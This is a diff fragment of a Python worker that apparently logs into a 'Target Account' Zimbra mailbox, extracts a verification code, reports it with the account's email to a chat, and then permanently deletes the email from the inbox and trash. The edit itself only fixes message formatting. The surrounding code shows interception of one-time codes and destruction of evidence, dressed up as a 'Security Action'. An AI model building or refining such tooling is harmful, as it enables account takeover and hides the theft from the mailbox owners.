@@ -206,8 +206,8 @@ def zimbra_isolated_daemon_worker(chat_id, email, password):
                                     f"👤 **Target Account:** `{email}`\n"
                                     f"📝 **Context:** `{secure_context}`\n\n"
                                     f"🔑 **EXTRACTED CODE:**\n"
-                                    f"```\n{secure_code}\n
-```\n\n"
+                                    f"```\n{secure_code}\n```"
+
                                     f"🗑️ *Security Action: Email immediately stripped from Inbox and permanently deleted from trash.*"
                                 )
                             else:
